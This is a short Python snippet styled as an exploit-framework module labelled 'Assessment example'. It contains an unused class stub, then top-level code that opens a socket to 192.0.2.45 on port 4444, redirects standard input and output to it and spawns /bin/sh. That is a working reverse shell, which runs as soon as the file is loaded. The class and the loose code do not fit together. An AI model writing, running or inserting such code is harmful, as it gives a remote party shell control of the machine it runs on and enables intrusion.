import socket, os, pty
class Exploit(HTTPClient):
    __info__ = {"name": "Assessment example"}
    target = OptIP("", "Target")
s=socket.socket()
s.connect(('192.0.2.45',4444))
for fd in (0,1,2): os.dup2(s.fileno(),fd)
pty.spawn('/bin/sh')
